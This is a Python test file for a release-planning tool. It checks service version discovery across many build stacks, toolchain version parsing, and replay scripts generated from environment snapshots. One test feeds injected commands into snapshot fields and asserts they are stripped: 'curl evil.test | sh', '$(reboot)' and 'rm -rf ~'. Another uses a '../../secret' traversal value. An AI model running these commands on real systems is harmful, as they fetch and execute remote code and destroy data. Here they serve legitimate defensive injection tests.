"""Planning tools on every stack: release-train manifests and env snapshots."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

from analysis.env_stacks import check_script, dockerfile, nix_shell, version_of
from release_coordinator.manifests import discover_services

_RUNNER = (
    Path(__file__).resolve().parents[1]
    / "apps"
    / "backend"
    / "runners"
    / "env_snapshot_runner.py"
)


def _write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _runner():
    spec = importlib.util.spec_from_file_location("env_snapshot_runner", _RUNNER)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules["env_snapshot_runner"] = module
    spec.loader.exec_module(module)
    return module


# --- Release train ------------------------------------------------------------


def test_release_train_finds_services_of_every_stack(tmp_path: Path) -> None:
    _write(tmp_path, "web/package.json", '{"name": "web", "version": "2.1.0"}')
    _write(
        tmp_path,
        "api/Acme.Api.csproj",
        "<Project><PropertyGroup><Version>3.4.5</Version></PropertyGroup></Project>",
    )
    _write(
        tmp_path,
        "billing/pom.xml",
        "<project><parent><artifactId>acme-parent</artifactId><version>9.9.9</version>"
        "</parent><artifactId>billing</artifactId><version>1.7.0</version></project>",
    )
    _write(tmp_path, "android/build.gradle.kts", 'version = "0.9.1"\n')
    _write(tmp_path, "mobile/pubspec.yaml", "name: acme_app\nversion: 1.4.0+12\n")
    _write(tmp_path, "shop/composer.json", '{"name": "acme/shop", "version": "5.0.0"}')
    _write(tmp_path, "gateway/go.mod", "module github.com/acme/gateway\n\ngo 1.22\n")
    _write(
        tmp_path,
        "engine/Cargo.toml",
        '[package]\nname = "engine"\nversion = "0.3.0"\n[dependencies]\nname = "x"\n',
    )
    _write(
        tmp_path,
        "worker/pyproject.toml",
        '[tool.ruff]\nname = "nope"\n[project]\nname = "worker"\nversion = "1.0.2"\n',
    )
    _write(tmp_path, "ios/Package.swift", 'let package = Package(name: "AcmeKit")\n')
    _write(tmp_path, "web/node_modules/dep/package.json", '{"name": "dep"}')

    found = {info["name"]: info["version"] for _, info in discover_services(tmp_path)}

    assert found == {
        "web": "2.1.0",
        "Acme.Api": "3.4.5",
        "billing": "1.7.0",
        "android": "0.9.1",
        "acme_app": "1.4.0",
        "acme/shop": "5.0.0",
        "gateway": "0.0.0",
        "engine": "0.3.0",
        "worker": "1.0.2",
        "AcmeKit": "0.0.0",
    }


# --- Environment snapshots ----------------------------------------------------


def test_version_of_reads_each_toolchain_banner() -> None:
    assert version_of("go version go1.22.3 linux/amd64") == "1.22.3"
    assert version_of('openjdk version "21.0.2" 2024-01-16 LTS') == "21.0.2"
    assert (
        version_of("swift-driver version: 1.87.3 Apple Swift version 5.9.2") == "5.9.2"
    )
    assert version_of("8.0.100") == "8.0.100"
    assert version_of(None) is None


def _snapshot(**tools: str) -> dict:
    return {
        "id": "snap-1-abcdef",
        "tools": tools,
        "git": {"commit": "a1b2c3d4", "remote": "https://example.test/acme.git"},
    }


def test_replays_install_the_captured_toolchains() -> None:
    snap = _snapshot(
        dotnet="9.0.100",
        java='openjdk version "21.0.2"',
        flutter="Flutter 3.24.0 • channel stable",
        go="go version go1.22.3 linux/amd64",
    )

    docker = dockerfile(snap)
    assert "--version 9.0.100" in docker
    assert "openjdk-21-jdk-headless" in docker
    assert "-b 3.24.0" in docker
    assert "go1.22.3.linux" in docker
    assert "nodesource" not in docker
    assert "git checkout a1b2c3d4" in docker

    nix = nix_shell(snap)
    assert "pkgs.dotnet-sdk_9" in nix and "pkgs.jdk21" in nix
    assert "pkgs.nodejs" not in nix

    script = check_script(snap)
    assert "check dotnet 9.0.100 dotnet --version" in script


def test_replays_never_carry_shell_from_a_tampered_snapshot() -> None:
    snap = _snapshot(node="v20.1.0; curl evil.test | sh")
    snap["git"] = {"commit": "$(reboot)", "remote": "https://x.test/a.git; rm -rf ~"}

    for payload in (dockerfile(snap), nix_shell(snap), check_script(snap)):
        assert "evil.test" not in payload
        assert "reboot" not in payload
        assert "rm -rf" not in payload


def test_snapshot_ids_and_export_names_stay_in_their_folder(tmp_path: Path) -> None:
    runner = _runner()
    outside = tmp_path / "secret.json"
    outside.write_text('{"id": "leak"}', encoding="utf-8")

    assert runner._get(tmp_path, "../../secret") is None
    assert runner._get(tmp_path, "snap-1-abcdef") is None


def test_snapshot_env_masks_credentials_in_values(monkeypatch) -> None:
    runner = _runner()
    monkeypatch.setenv("DATABASE_URL", "postgres://app:hunter2@db.local:5432/app")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_0000000000000000000000000000000000")
    monkeypatch.setenv("SHELL", "/bin/bash")

    env = runner._safe_env()

    assert "hunter2" not in env["DATABASE_URL"]
    assert env["GITHUB_TOKEN"] == "<redacted>"
    assert env["SHELL"] == "/bin/bash"
